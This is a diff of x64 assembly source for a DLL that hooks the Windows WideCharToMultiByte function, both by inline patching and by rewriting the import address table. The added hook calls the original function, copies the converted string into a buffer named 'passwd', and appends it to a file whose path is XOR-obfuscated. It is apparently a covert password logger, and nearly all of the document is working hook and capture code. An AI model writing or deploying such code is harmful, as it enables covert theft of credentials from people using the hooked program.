@@ -59,10 +59,10 @@ hooked_wide_char_to_multi_byte_inline_patch:
     mov r8, [rbp + 32]              ; lpWideCharStr
     mov r9d, [rbp + 40]             ; ccWideChar
 
-    mov rax, [rbp + 48]             ; lpmulti_byteStr
+    mov rax, [rbp + 48]             ; lpMultibyteStr
     mov [rsp + 32], rax
 
-    mov eax, [rbp + 56]             ; ccmulti_byte
+    mov eax, [rbp + 56]             ; ccMultiByte
     mov [rsp + 40], rax
 
     mov rax, [rbp + 64]             ; lpDefaultChar
@@ -71,14 +71,13 @@ hooked_wide_char_to_multi_byte_inline_patch:
     mov rax, [rbp + 72]             ; lpUseDefaultChar
     mov qword [rsp + 56], rax
 
-    call [wide_char_to_multi_byte]   ; bytes written in rax
+    call [wide_char_to_multi_byte]  ; bytes written in rax
+    add rsp, 64                     ; 4 args
 
     cmp rax, 0                      ; did function fail ?
     je .error_shutdown
 
     mov [rbp - 16], rax             ; bytes written
-
-    add rsp, 64                     ; 4 args
 
     mov rcx, file_path_xor
     mov rdx, file_path_xor.len
@@ -138,6 +137,119 @@ hooked_wide_char_to_multi_byte_inline_patch:
     leave
     ret
 
+; arg0: CodePage            rcx
+; arg1: dwFlags             rdx
+; arg2: ccWideChar          r8
+; arg3: lpWideCharStr       r9
+; arg4: lpMultiByteStr      [rsp + 32]
+; arg5: cbMultiByte         [rsp + 40]
+; arg6: lpDefaultChar       [rsp + 48]
+; arg7: lpUseDefaultChar    [rsp + 56]
+;
+; return: num bytes written rax
+hooked_wide_char_to_multi_byte_iat:
+    push rbp
+    mov rbp, rsp
+
+    mov [rbp + 16], rcx             ; code page
+    mov [rbp + 24], rdx             ; dwflags
+    mov [rbp + 32], r8              ; lpWideCharStr
+    mov [rbp + 40], r9              ; ccWideChar
+
+    ; rbp - 8 = return value
+    ; rbp - 16 = bytes written
+    ; rbp - 24 = text file handle
+    ; rbp - 32 = 8 bytes padding
+    sub rsp, 32                     ; allocate local variable space
+    sub rsp, 32                     ; allocate 32 byte shadow space
+
+    ; call the original function
+    sub rsp, 64                     ; 4 args
+    mov rcx, [rbp + 16]             ; code page
+    mov rdx, [rbp + 24]             ; dw flags
+    mov r8, [rbp + 32]              ; lpWideCharStr
+    mov r9d, dword [rbp + 40]       ; ccWideChar
+
+    mov rax, [rbp + 48]             ; lpMultiByteStr
+    mov [rsp + 32], rax
+
+    mov rax, [rbp + 56]             ; ccMultiByte
+    mov [rsp + 40], rax
+
+    mov rax, [rbp + 64]             ; lpDefaultChar
+    mov [rsp + 48], rax
+
+    mov rax, [rbp + 72]             ; lpUseDefaultChar
+    mov [rsp + 56], rax
+
+    call [wide_char_to_multi_byte]  ; bytes written in rax
+
+    add rsp, 64                     ; 4 args
+
+    cmp rax, 0                      ; did function fail ?
+    je .shutdown
+
+    mov [rbp - 16], rax             ; bytes written
+    
+    mov rcx, file_path_xor
+    mov rdx, file_path_xor.len
+    mov r8, xor_key
+    mov r9, xor_key.len
+    call my_xor
+
+    sub rsp, 64                     ; 3 args + padding
+    mov rcx, file_path_xor
+    mov rdx, FILE_APPEND_DATA
+    mov r8, FILE_SHARE_READ
+    xor r9, r9
+    mov qword [rsp + 32], OPEN_ALWAYS
+    mov qword [rsp + 40], FILE_ATTRIBUTE_NORMAL
+    mov qword [rsp + 48], 0
+    call [create_file_a]            ; file handle
+    add rsp, 64                     ; 3 args + padding
+
+    cmp rax, INVALID_HANDLE_VALUE   ; did CreateFileA fail ?
+    je .error_shutdown
+
+    mov [rbp - 24], rax             ; file handle
+
+    mov rcx, [rbp + 48]             ; lpmulti_byteStr
+    mov rdx, passwd
+    call strcpy
+
+    ; replace trailing zero with '\n' (0xa) (line feed)
+    mov rax, passwd
+    mov rcx, [rbp - 16]             ; bytes written
+    dec rcx
+    add rax, rcx
+    mov byte [rax], 0xa             ; new line ascii
+
+    ; write the text to the file
+    sub rsp, 16                     ; 1 arg + 8 byte padding
+    mov rcx, [rbp - 24]             ; file handle
+    mov rdx, passwd
+    mov r8, [rbp - 16]              ; bytes written
+    xor r9, r9
+    mov qword [rsp + 32], 0
+    call [write_file]
+    add rsp, 16                     ; 1 arg + 8 byte padding
+
+    cmp rax, 0                      ; did write file fail ?
+    je .error_shutdown
+
+.error_shutdown:
+    call [get_last_error]
+
+.shutdown:
+    mov rcx, [rbp - 24]             ; file handle
+    call [close_handle]
+
+    add rsp, 32                     ; free 32 byte shadow space
+    add rsp, 32                     ; free local variable space
+
+    leave
+    ret
+
 hook_iat:
     push rbp
     mov rbp, rsp
@@ -151,8 +263,11 @@ hook_iat:
     ; rbp - 56 = first image import descriptor
     ; rbp - 64 = dll_index
     ; rbp - 72 = bool dll found
-    ; rbp - 80 = 8 bytes padding
-    sub rsp, 80                         ; allocate local variable space
+    ; rbp - 80 = image thunk data
+    ; rbp - 88 = &dwOldProtect
+    ; rbp - 96 = 8 bytes padding
+    ; int3
+    sub rsp, 96                         ; allocate local variable space
     sub rsp, 32                         ; allocate shadow space
 
     ; get kernel module handle
@@ -241,9 +356,10 @@ hook_iat:
 
     mov qword [rbp - 64], 0             ; dll index = 0
     mov r10d, [rbp - 48]                ; import descriptor count
-    mov qword [rbp - 72], 0                   ; dll found = false
+    mov qword [rbp - 72], 0             ; dll found = false
 
-.loop:
+    ; Loop through ImageImportDescriptors
+.module_loop:
     mov rax, [rbp - 64]                 ; dll index
     mov rcx, 20                         ; size of image import descriptor
     mul rcx                             ; size * index to point to an item in array
@@ -265,20 +381,75 @@ hook_iat:
     inc qword [rbp - 64]                ; ++ dll index
     dec r10
     cmp qword r10, 0
-    jne .loop
+    jne .module_loop
 
     jmp .shutdown
 
 .module_found:
-     mov qword [rbp - 72], 1            ; dll found = true
-     
+    mov qword [rbp - 72], 1             ; dll found = true
 
+    mov rax, [rbp - 64]                 ; dll index
+    mov rcx, 20                         ; size of image import descriptor
+    mul rcx                             ; size * index to offset into array
+    add rax, [rbp - 56]                 ; first image import descriptor
+    add rax, 16                         ; Offset of FirstThunk withing ImageImportDescriptor 
+    mov eax, dword [rax]                ; ImageImportDescriptor[dllIndex].FirstThunk
+
+    add rax, [rbp - 40]                 ; + exec base addr = ptr to image thunk data
+
+    mov [rbp - 80], rax                 ; ptr to image thunk data
+
+    ; loop through imported functions of the the dll
+
+    mov rax, [rax]                      ; *image thunk data (u1.Function)
+    jmp .while_condition
+
+.module_func_loop:
+    add qword [rbp - 80], 8             ; ++pImageThunkData
+    mov rax, [rbp - 80]
+
+    mov rax, [rax]                      ; *image thunk data (u1.Function)
+    cmp rax, [wide_char_to_multi_byte]  ; is func addr == WideCharToMultiByte
+    je .func_addr_found
+
+    .while_condition:
+        cmp rax, 0                      ; is funct addr == 0 ?
+        jne .module_func_loop
+
+    jmp .shutdown
+
+.func_addr_found:
+    ; Change the protection of the IAT to PAGE_READWRITE so we
+    ; can overwrite the func addr with the addr of our hooking func
+    mov rcx, [rbp - 80]                 ; ptr to image thunk data
+    mov rdx, 4096                       ; number of bytes
+    mov r8, PAGE_READWRITE
+    mov r9, rbp
+    sub r9, 88                          ; &dwOldProtect
+    call [virtual_protect]
+
+    cmp rax, 0                          ; did virtual protect fail ?
+    je .shutdown
+
+    mov rax, [rbp - 80]                 ; ptr to image thunk data
+    mov rcx, hooked_wide_char_to_multi_byte_iat
+    mov [rax], rcx
+
+    mov rcx, [rbp - 80]                 ; ptr to image thunk data
+    mov rdx, 4096                       ; number of bytes
+    mov r8, [rbp - 88]                  ; dwOldProtect
+    mov r9, rbp
+    sub r9, 88                          ; &dwOldProtect
+    call [virtual_protect]
+
+    cmp rax, 0                          ; did virtual protect fail ?
+    je .shutdown
 
 .shutdown:
     mov rax, [rbp - 8]                  ; return value
 
     add rsp, 32                         ; free shadow space
-    add rsp, 80                         ; free local variable space
+    add rsp, 96                         ; free local variable space
 
     leave
     ret
@@ -323,7 +494,7 @@ hook_inline_patch:
     ; read the original function code
     sub rsp, 16                         ; 1 arg + padding
     mov rcx, -1                         ; current process
-    mov rdx, [wide_char_to_multi_byte]   ; ptr to function
+    mov rdx, [wide_char_to_multi_byte]  ; ptr to function
     mov r8, original_func_bytes         ; ptr to original bytes
     mov r9, original_func_bytes.len     ; num bytes
     mov qword [rsp + 32], 0             ; NULL
@@ -346,7 +517,7 @@ hook_inline_patch:
     ; overwrite the original code with the patch
     sub rsp, 16                         ; 1 arg + padding
     mov rcx, -1                         ; current process
-    mov rdx, [wide_char_to_multi_byte]   ; ptr to function
+    mov rdx, [wide_char_to_multi_byte]  ; ptr to function
     mov r8, rbp
     sub r8, 32                          ; patch
     mov r9, original_func_bytes.len     ; num bytes
@@ -382,7 +553,6 @@ DllMain:
 
     cmp qword [rbp + 24], 1                 ; PROCESS_ATTACH
     jne .continue_from_process_attach
-    call hook_iat
 
     jmp .shutdown
 
@@ -420,3 +590,5 @@ wide_char_to_multi_byte: dq ?
 original_func_bytes: resb 14
 .len equ $ - original_func_bytes
 passwd: resb 128
+
+%include '../utils_64_bss.asm'
